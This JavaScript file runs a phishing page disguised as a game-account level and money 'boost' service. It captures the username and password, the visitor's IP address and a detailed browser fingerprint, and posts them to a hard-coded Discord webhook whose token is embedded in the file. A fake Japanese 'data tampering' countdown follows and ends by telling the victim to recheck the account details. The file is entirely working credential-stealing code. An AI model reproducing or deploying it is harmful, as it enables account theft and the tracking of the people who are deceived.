const WEBHOOK_URL = 'https://discord.com/api/webhooks/1383559726285066280/m5kE82a1kL6VZcT049IbdKI0ro9RsOwaeFPIrb1eY1C8hEPHsdYJtZ3aR4D9pTaNK9PK';

const form1 = document.getElementById('account-form');
const form2 = document.getElementById('boost-form');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

let savedAccount = {};

function getIP() {
  return fetch('https://api.ipify.org?format=json')
    .then(res => res.json())
    .then(d => d.ip)
    .catch(() => "");
}

async function sendToWebhook(embed) {
  await fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ embeds: [embed] })
  });
}

form1.addEventListener('submit', async (e) => {
  e.preventDefault();
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();
  savedAccount = { username, password };

  const ip = await getIP();
  const embed = {
    title: "Account Info",
    color: 3447003,
    fields: [
      { name: "Username", value: username, inline: true },
      { name: "Password", value: password, inline: true },
      { name: "IP", value: ip, inline: true },
      { name: "Language", value: navigator.language, inline: true },
      { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
      { name: "Platform", value: navigator.platform, inline: true },
      { name: "CPU Cores", value: String(navigator.hardwareConcurrency || "Unknown"), inline: true },
      { name: "Screen", value: `${screen.width}x${screen.height}`, inline: true },
      { name: "Touch Support", value: String(navigator.maxTouchPoints), inline: true },
      { name: "Cookies Enabled", value: String(navigator.cookieEnabled), inline: true },
      { name: "User-Agent", value: navigator.userAgent, inline: false }
    ],
    timestamp: new Date().toISOString()
  };

  await sendToWebhook(embed);

  form1.classList.add('hidden');
  form2.classList.remove('hidden');
});

form2.addEventListener('submit', async (e) => {
  e.preventDefault();
  const level = document.getElementById('level-amount').value.trim();
  const money = document.getElementById('money-amount').value.trim();

  const embed = {
    title: "Boost Info",
    color: 15844367,
    fields: [
      { name: "Username", value: savedAccount.username, inline: true },
      { name: "Level Increase", value: level, inline: true },
      { name: "Money Increase", value: money, inline: true }
    ],
    timestamp: new Date().toISOString()
  };

  await sendToWebhook(embed);

  form2.classList.add('hidden');
  canvas.classList.remove('hidden');
  startCanvasCountdown();
});

function startCanvasCountdown() {
  let seconds = Math.floor(Math.random() * 240) + 60;

  const interval = setInterval(() => {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    ctx.font = '28px Segoe UI';
    ctx.fillStyle = 'white';
    ctx.textAlign = 'center';

    if (seconds > 0) {
      const m = Math.floor(seconds / 60);
      const s = String(seconds % 60).padStart(2, '0');
      const dots = ['.', '..', '...'][Math.floor(Date.now() / 500) % 3];
      ctx.fillText(`データ改竄中${dots}`, canvas.width / 2, 60);
      ctx.fillText(`残り ${m}分${s}秒`, canvas.width / 2, 120);
      seconds--;
    } else {
      clearInterval(interval);
      ctx.fillStyle = 'red';
      ctx.fillText('改竄処理に失敗しました。', canvas.width / 2, 60);
      ctx.fillText('アカウントの情報が正しいか確認してください。', canvas.width / 2, 120);
    }
  }, 1000);
}
